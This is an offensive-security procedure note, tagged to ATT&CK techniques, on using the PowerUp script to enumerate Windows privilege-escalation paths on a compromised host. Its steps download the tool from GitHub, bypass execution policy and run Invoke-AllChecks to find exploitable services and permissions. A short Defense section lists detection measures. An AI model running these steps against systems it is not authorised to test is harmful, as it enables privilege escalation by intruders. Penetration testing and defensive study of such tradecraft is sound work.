---
type: procedure
description: >-
  Use the PowerUp PowerShell script to identify common privilege escalation
  vectors on Windows systems through automated enumeration of misconfigurations,
  services, and registry settings.
verified: true
submitted: false
tactics:
  - '[[Defense Evasion]]'
  - '[[Discovery]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Account Discovery]]'
  - '[[DLL Search Order Hijacking]]'
  - '[[File System Permissions Weakness]]'
  - '[[Modify Existing Service]]'
  - '[[Path Interception]]'
  - '[[Permission Groups Discovery]]'
  - '[[Query Registry]]'
  - '[[System Information Discovery]]'
sub_techniques: []
tags:
  - misconfiguration
  - service-attacks
  - privilege-escalation
  - enumeration
commands:
  - '[[commands/invoke-powerup-all-checks]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerUp]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Enumerate-Windows-for-Privilege-Escalation-Using-PowerUp

## Summary

This procedure utilizes the PowerUp PowerShell script to perform comprehensive enumeration on a Windows system, identifying potential privilege escalation opportunities such as modifiable services, weak file permissions, DLL hijacking paths, and registry misconfigurations. It automates the discovery of common vectors that could allow a low-privileged user to elevate to SYSTEM or administrator access, making it a key step in post-exploitation assessments.

## Description

PowerUp is a module from the PowerSploit framework designed specifically for privilege escalation checks on Windows environments. It scans for vulnerabilities like unquoted service paths, services running as SYSTEM with writable binaries, always-installed paths vulnerable to hijacking, and registry entries that could be abused. This procedure is typically used after initial access to a compromised host, where the attacker has command execution but limited privileges. By running Invoke-AllChecks, it generates a report highlighting exploitable issues, which can then be followed up with targeted exploitation procedures. The script runs entirely in memory via PowerShell, minimizing disk footprints, but requires execution policy bypass if restricted.

## Requirements

1. PowerShell execution access on the target Windows system (version 2.0 or higher).
2. Low-privileged user account with local execution rights (e.g., via initial access vector like phishing or RDP).
3. Network access to download the PowerUp script if not pre-staged (e.g., from GitHub).
4. Optional: Administrative shares or write access to a temporary directory for output files.

## Defense

Defensive measures include enabling PowerShell constrained language mode, logging script block execution via Sysmon or Advanced Audit Policy, monitoring for downloads from known offensive security repositories, and implementing application whitelisting (e.g., AppLocker) to block unsigned scripts. Detection can focus on anomalous PowerShell processes spawning from non-interactive sessions or querying sensitive registry keys.

## Objectives

1. Identify modifiable services and binaries that allow privilege escalation.
2. Discover weak permissions on files, directories, and registry hives.
3. Enumerate potential DLL and path interception opportunities.
4. Generate actionable output for subsequent exploitation steps.

## Instructions

### Step 1: Download and Stage PowerUp Script

**Context**: Obtain the PowerUp.ps1 script from its official repository and transfer it to the target system. This ensures the tool is available for import without relying on live internet access during execution, reducing detection risk.

Use a tool like PowerShell's Invoke-WebRequest or manual download via browser on the target to fetch the script. Save it to a temporary location like $env:TEMP.

**Command** ([[commands/download-powerup-script]]):
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -OutFile "$env:TEMP\PowerUp.ps1"
```

> This command downloads the script directly to the temp directory. Verify the file size (approximately 100KB) and integrity by checking the MD5 hash against the repository if possible.

### Step 2: Import the PowerUp Module

**Context**: Load the PowerUp script into the current PowerShell session as a module. This makes its functions, including Invoke-AllChecks, available for execution. Bypass execution policy if needed to allow unsigned scripts.

Set the execution policy temporarily and import the module from the staged file.

**Command** ([[commands/import-powerup-module]]):
```powershell
Set-ExecutionPolicy Bypass -Scope Process; Import-Module .\$env:TEMP\PowerUp.ps1
```

> Successful import will not produce visible output but allows access to PowerUp cmdlets. Test by running Get-Command -Module PowerUp to list available functions.

### Step 3: Run Comprehensive Enumeration Checks

**Context**: Execute the main function to perform all privilege escalation checks. This scans services, files, registry, and more, outputting potential vectors directly to the console or a file for review.

Invoke the all-checks function, optionally redirecting output to a file for later analysis.

**Command** ([[commands/invoke-powerup-all-checks]]):
```powershell
Invoke-AllChecks -Verbose
```

> The command runs multiple sub-checks and highlights issues in yellow/red. Review output for sections like 'Modifiable Services' or 'Unquoted Paths'. If verbose mode is used, it provides detailed reasoning for each finding.

### Step 4: Parse and Validate Results

**Context**: Analyze the output to identify high-value vectors and verify them manually if needed. This step ensures the findings are actionable and not false positives due to system variations.

Redirect output to a file for parsing: Invoke-AllChecks | Out-File checks.txt. Manually inspect for exploits like services with StartService permissions.

No specific command here; use built-in PowerShell like Select-String for keywords (e.g., 'writable', 'hijack').

> Success is indicated by specific vulnerable items listed, such as a service binary that is writable by the current user.
